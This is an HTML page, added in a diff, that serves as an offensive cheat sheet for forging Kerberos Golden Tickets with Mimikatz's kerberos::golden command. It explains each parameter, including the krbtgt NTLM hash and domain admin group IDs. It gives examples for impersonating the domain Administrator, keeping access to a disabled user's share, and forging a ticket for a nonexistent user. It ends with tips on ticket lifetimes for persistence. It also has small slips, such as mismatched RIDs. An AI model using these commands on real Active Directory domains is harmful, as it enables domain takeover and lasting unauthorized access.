@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Creation</title>
+</head><body>kerberos::golden<br/>
+&nbsp;/domain: domain.local &#09;&#09;&#09;&#09;&#09;&#09;&#09;domain name<br/>
+&nbsp;/sid: S-1-5-21-130452501-2365100805-3685010670&#09;domain SID<br/>
+&nbsp;/rc4: 310b643c5316c8c3c70a10cfb17e2e31 &#09;&#09;NTLM hash of krbtgt<br/>
+&nbsp;/user: Administrator &#09;&#09;&#09;&#09;&#09;&#09;&#09;username you wanna be<br/>
+&nbsp;/id: 500 &#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;RID of username (500 is THE domain admin)<br/>
+&nbsp;/groups: 513, 512, 520, 518, 519 &#09;&#09;&#09;&#09;&#09;Groups list of the user (be imaginative)<br/>
+&nbsp;/ticket: Administrator.kirbi &#09;&#09;&#09;&#09;&#09;&#09;The ticket filename<br/>
+<br/>
+<br/>
+Client name: Administrator<br/>
+Service name: krbtgt/domain.local<br/>
+Validity<br/>
+&nbsp;&#09;Start time: <br/>
+&nbsp;&#09;End time:<br/>
+Authorization data Microsoft (PAC)<br/>
+Username: Adminsitrator<br/>
+Domain SID<br/>
+User ID 500<br/>
+Groups ID<br/>
+&nbsp;&#09;512<br/>
+&nbsp;&#09;519 <br/>
+&nbsp;&#09;...<br/>
+<br/>
+Example time!<br/>
+We want to have a long time access to a share limited to a user "utilisateur", disabled<br/>
+kerberos::golden<br/>
+&nbsp;/domain: domain.local<br/>
+&nbsp;/sid: utilisateur's sid<br/>
+&nbsp;/aes256: hash<br/>
+&nbsp;/user: srvcharly$ &#09;&#09;&#09;&lt;= real account always in good state<br/>
+&nbsp;/id: 1001 &#09;&#09;&#09;&#09;&lt;= RID of the real account<br/>
+&nbsp;/groups: 513, 1106 &#09;&#09;&lt;= 1107 is the RID of the "utilisateur" account...yep...in groups<br/>
+&nbsp;/ticket: fake_utilisateur.kirbi<br/>
+<br/>
+More examples<br/>
+kerberos::golden<br/>
+&nbsp;/domain: domain.local<br/>
+&nbsp;/sid: Administrator's sid<br/>
+&nbsp;/rc4: hash<br/>
+&nbsp;/user: badguy<br/>
+&nbsp;/id: 0xffffffff<br/>
+&nbsp;/groups: 513, 512, 520, 518, 519<br/>
+&nbsp;/ticket: badguy.kirbi<br/>
+<br/>
+Yes, neither the User NOR the ID exist, so this TGT will only work for 20 minutes (TGS watchdog)<br/>
+&nbsp;&#09;It works if an ACL is defined with groups (this example spoofs a user in domain admins group; 512)<br/>
+&nbsp;&#09;But all TGS obtained in this 20 minutes will be valid for 10h!<br/>
+&nbsp;&#09;AND you can make multiple TGTs...<br/>
+</body></html>
